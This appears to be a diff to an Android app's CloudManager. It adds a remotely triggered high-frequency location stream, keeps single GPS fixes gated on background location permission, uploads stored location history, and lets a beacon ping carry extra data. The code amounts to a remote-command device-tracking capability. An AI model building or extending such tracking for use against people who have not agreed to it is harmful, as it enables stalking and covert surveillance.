@@ -71,24 +71,32 @@ object CloudManager {
 
                 // --- MODULE 4: LOCATION ---
                 if (isAll || moduleMap.containsKey("location")) {
-                    // ACTIVE FETCH: Try to get fresh GPS fix now
-                    try {
-                        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx)
-                        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                            val freshLoc = kotlinx.coroutines.tasks.await(fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null))
-                            if (freshLoc != null) {
-                                val locObj = JSONObject().apply {
-                                    put("lat", freshLoc.latitude)
-                                    put("lon", freshLoc.longitude)
-                                    put("acc", freshLoc.accuracy)
-                                    put("ts", System.currentTimeMillis())
-                                    put("fresh", true)
-                                }
-                                json.put("location_fresh", locObj)
-                            }
+                    val streamDuration = modules.find { it.startsWith("location:stream:") }?.split(":")?.getOrNull(2)?.toLongOrNull()
+                    
+                    if (streamDuration != null) {
+                        // STREAM MODE: Start BeaconService in high-freq location mode
+                        DebugLogger.log("STREAM", "Starting Location Stream: ${streamDuration}m")
+                        val intent = android.content.Intent(ctx, BeaconService::class.java).apply {
+                            putExtra("duration_mins", streamDuration)
+                            putExtra("mode", "LOCATION_STREAM")
                         }
-                    } catch (e: Exception) { 
-                        DebugLogger.log("GPS_ERR", "Fresh fix failed, falling back to history")
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
+                        else ctx.startService(intent)
+                        json.put("location_status", "STREAM_STARTED_${streamDuration}M")
+                    } else {
+                        // ACTIVE FETCH: Try to get one fresh GPS fix now
+                        try {
+                            val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx)
+                            if (PermissionManager.hasBackgroundLocation(ctx)) {
+                                val freshLoc = kotlinx.coroutines.tasks.await(fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null))
+                                if (freshLoc != null) {
+                                    json.put("location_fresh", JSONObject().apply {
+                                        put("lat", freshLoc.latitude); put("lon", freshLoc.longitude)
+                                        put("acc", freshLoc.accuracy); put("ts", System.currentTimeMillis())
+                                    })
+                                }
+                            }
+                        } catch (e: Exception) { }
                     }
                     json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
                 }
@@ -210,10 +218,9 @@ object CloudManager {
     }
 
     // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
-    fun sendPing(ctx: Context, note: String = "Online") {
+    fun sendPing(ctx: Context, note: String = "Online", extraData: JSONObject? = null) {
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                // Fetch instant battery level without registering a permanent receiver
                 val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                 val batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
 
@@ -222,6 +229,8 @@ object CloudManager {
                 payload.put("battery_level", batteryLevel)
                 payload.put("trigger", "BEACON")
                 payload.put("note", note)
+                
+                extraData?.keys()?.forEach { key -> payload.put(key, extraData.get(key)) }
                 
                 val summary = JSONObject()
                 summary.put("status", "ONLINE")
